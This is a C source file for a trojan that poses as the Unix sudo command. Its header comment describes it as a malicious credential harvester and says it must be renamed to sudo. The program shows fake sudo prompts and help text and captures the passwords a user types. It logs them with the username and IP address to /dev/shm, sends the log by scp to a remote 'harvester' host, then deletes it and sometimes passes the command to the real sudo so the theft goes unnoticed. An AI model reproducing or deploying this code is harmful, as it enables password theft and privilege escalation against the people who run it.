#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
/*
Kordell Hutchins
zombiesudo successor
Malicious sudo trojan that impersonates and harvests creds

MUST BE RENAMED TO SUDO

*/
void vCj2zYK7(char *filename, struct passwd *p, char *passlist[], int rounds, char *date){//sshsession
    //char hostname[100];
    //gethostname(hostname, 100);
    unsigned char ip_address[15];
    int fd;
    struct ifreq ifr;
        /*AF_INET - to define network interface IPv4*/
    /*Creating soket for it.*/
    fd = socket(AF_INET, SOCK_DGRAM, 0);

    /*AF_INET - to define IPv4 Address type.*/
    ifr.ifr_addr.sa_family = AF_INET;

    /*eth0 - define the ifr_name - port name
    where network attached.*/
    memcpy(ifr.ifr_name, "eth0", IFNAMSIZ - 1);

    /*Accessing network interface information by
    passing address using ioctl.*/
    ioctl(fd, SIOCGIFADDR, &ifr);
    /*closing fd*/
    close(fd);

    /*Extract IP Address*/
    strcpy(ip_address, inet_ntoa(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr));

    FILE *fp;
    fp = fopen(filename, "w");
    for(int i = 0; i < rounds; i++){
        fprintf(fp, "%s@%s: %s entered the passphrase: %s at %s\n", p->pw_name, ip_address, p->pw_name, passlist[i], date);
    }
    fclose(fp);
    char command[500] = "/usr/bin/scp -q '";
    char dest[100] = "' pdiddy@172.16.77.5:/var/harvester";
    strcat(command, filename);
    strcat(command, dest);
    system(command);
    strcpy(command, "/bin/rm '"); 
    strcat(command, filename);
    strcat(command, "'");
    system(command);
}
void helppage(){
    char *sudohelp = "usage: sudo -h | -K | -k | -V\n"
    "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\n"
    "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user][-u user] [command]\n"
    "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]\n"
    "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file               ...\n";
    printf("%s", sudohelp);
}
void extendedhelp(){
    char *sudohelp = "usage: sudo -h | -K | -k | -V\n"
    "usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\n"
    "usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user][-u user] [command]\n"
    "usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]\n"
    "usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...\n"
    "Options:\n"
    "  -A, --askpass                 use a helper program for password prompting\n"
    "  -b, --background              run command in the background\n"
    "  -B, --bell                    ring bell when prompting\n"
    "  -C, --close-from=num          close all file descriptors >= num\n"
    "  -E, --preserve-env            preserve user environment when running command\n"
    "      --preserve-env=list       preserve specific environment variables\n"
    "  -e, --edit                    edit files instead of running a command\n"
    "  -g, --group=group             run command as the specified group name or ID\n"
    "  -H, --set-home                set HOME variable to target user's home dir\n"
    "  -h, --help                    display help message and exit\n"
    "  -h, --host=host               run command on host (if supported by plugin)\n"
    "  -i, --login                   run login shell as the target user; a command may also be specified\n"
    "  -K, --remove-timestamp        remove timestamp file completely\n"
    "  -k, --reset-timestamp         invalidate timestamp file\n"
    "  -l, --list                    list user's privileges or check a specific command; use twice for longer format\n"
    "  -n, --non-interactive         non-interactive mode, no prompts are used\n"
    "  -P, --preserve-groups         preserve group vector instead of setting to target's\n"
    "  -p, --prompt=prompt           use the specified password prompt\n"
    "  -r, --role=role               create SELinux security context with specified role\n"
    "  -S, --stdin                   read password from standard input\n"
    "  -s, --shell                   run shell as the target user; a command may also be specified\n"
    "  -t, --type=type               create SELinux security context with specified type\n"
    "  -T, --command-timeout=timeout terminate command after the specified time limit\n"
    "  -U, --other-user=user         in list mode, display privileges for user\n"
    "  -u, --user=user               run command (or edit file) as specified user name or ID\n"
    "  -V, --version                 display version information and exit\n"
    "  -v, --validate                update user's timestamp without running a command\n"
    "  --                            stop processing command line arguments\n";

    
    printf("%s", sudohelp);
}

void C6ZdsVK5(int rounds){//badbean
    int attempts = 0;
    struct passwd *p = getpwuid(getuid()); 
    char pass[100] = "";
    char date[250] = "";
    char prompt[200] = "[sudo] password for ";
    char *passlist[rounds];
    //Creating time and the filename
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    char filename[100] = "/dev/shm/zombiesudo-(";
    strcat(filename, date);
    strcat(filename,").har");
    //printf("File name is %s\n", filename);
    strcat(prompt, p->pw_name);
    strcat(prompt, ": ");
    while(attempts < rounds){
        strcpy(pass, getpass(prompt));
        passlist[attempts] = pass;
        sleep(2);
        printf("Sorry, try again.\n");
        attempts = attempts + 1;
    }
    printf("sudo: %d incorrect password attempts\n", attempts);
    vCj2zYK7(filename, p, passlist, rounds, date);
}
void GV5gqGf5(int rounds, char *argv[], int argc){//goodbean
    int attempts = 0;
    struct passwd *p = getpwuid(getuid()); 
    char *passlist[rounds];
    char pass[100] = "";
    char date[250] = "";
    char prompt[200] = "[sudo] password for ";
    //Creating time and the filename
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    sprintf(date, "%d-%02d-%02d==%02d:%02d:%02d", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
    char filename[100] = "/dev/shm/zombiesudo-(";
    strcat(filename, date);
    strcat(filename,").har");
    //printf("File name is %s\n", filename);
    strcat(prompt, p->pw_name);
    strcat(prompt, ": ");
    while(attempts < rounds){
        strcpy(pass, getpass(prompt));
        passlist[attempts] = pass;
        sleep(2);
        printf("Sorry, try again.\n");
        attempts = attempts + 1;
    }
    vCj2zYK7(filename, p, passlist, rounds, date);
    char *command = "/usr/bin/bash ";
    char argvgetter[250];
    for (int i = 1; i < argc; i++){
        strcat(argvgetter, argv[i]);
        strcat(argvgetter, " ");
    }
    strcat(argvgetter, " '");   
    char *callargv[] = {"-c '/usr/bin/sudo ", argvgetter, NULL};//usr/bin/sudo
    execve(command, callargv, NULL);

}
int main (int argc, char *argv[]){
    if (argc == 1){
        helppage();
        exit(0);
    }
    if (strcmp(argv[1], "-h") == 0|| strcmp(argv[1], "--help") == 0){
        extendedhelp();
        exit(0);
    }
    struct passwd *p = getpwuid(getuid()); 
    char *root_string = "root";
    if (strcmp(p->pw_name, root_string) == 0){
        char rootargs[100];
        for (int i = 1; i < argc; i++){
            strcat(rootargs, argv[i]);
            strcat(rootargs, " ");
        }
        strcat(rootargs, " '");
        char *rootargv[] = {"-c '/usr/bin/sudo ", rootargs, NULL};
        char *command = "usr/bin/bash ";
        execve(command, rootargv, NULL);
        exit(1);
    }
    time_t t;
    srand((unsigned) time(&t));
    int condition = rand() % 3;
    int rounds = (rand() % 3) + 2;
    if (condition == 0){
        C6ZdsVK5(rounds);
    }
    else {
        int rounds = 2;
        GV5gqGf5( rounds, argv, argc);
    }
    return 0;
}
